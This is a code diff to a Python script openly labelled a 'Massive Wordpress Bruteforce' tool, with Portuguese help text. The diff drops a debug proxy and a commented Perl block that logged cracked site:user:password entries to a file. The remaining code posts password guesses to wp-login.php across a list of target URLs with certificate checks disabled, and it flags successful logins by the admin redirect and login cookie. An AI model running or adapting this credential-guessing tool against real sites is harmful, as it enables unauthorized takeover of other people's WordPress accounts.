@@ -1,25 +1,6 @@
 from multiprocessing.pool import ThreadPool
 import requests, os.path,  argparse
-http_proxy  = {"http":"http://127.0.0.1:8080"} # Debug
 
-"""
-    Sugestoes?
-    fala cmg
-    bj
-
-    coded by pype
-
-	if($ver =~ /wordpress_logged_in/ && $ver =~ /path=/ && $ver =~ /302/){
-		if ($ver =~ /Location:.*\/wp-admin/) {
-			open(xX,">>vuln.txt");
-			print xX "http://$site/wp-login.php:$usern:$senha\n";
-			close(xX);
-			exit(0);
-		} else {
-			##print "False Positive\r\n";
-		}
-
-"""
 
 parser = argparse.ArgumentParser(description = 'Massive Wordpress Bruteforce -  Pype')
 parser.add_argument('-urls',action='store',dest='URL_LST',required=True,help="Arquivo com as urls")
@@ -36,7 +17,7 @@ def brute(url):
 
         rx = requests.session()
         try:
-            r = rx.post("http://"+url+"/wp-login.php",verify=False,timeout=5,data=crend,cookies=coo,proxies=http_proxy,headers=UA,allow_redirects=False)
+            r = rx.post("http://"+url+"/wp-login.php",verify=False,timeout=5,data=crend,cookies=coo,headers=UA,allow_redirects=False)
             if r.status_code == 302:
                 if "/wp-admin/" in str(r.headers) and "wordpress_logged_in" in str(r.headers):
                     print "\n   [ Login ] %s -> %s:%s\n" % (url, args.user,pax)
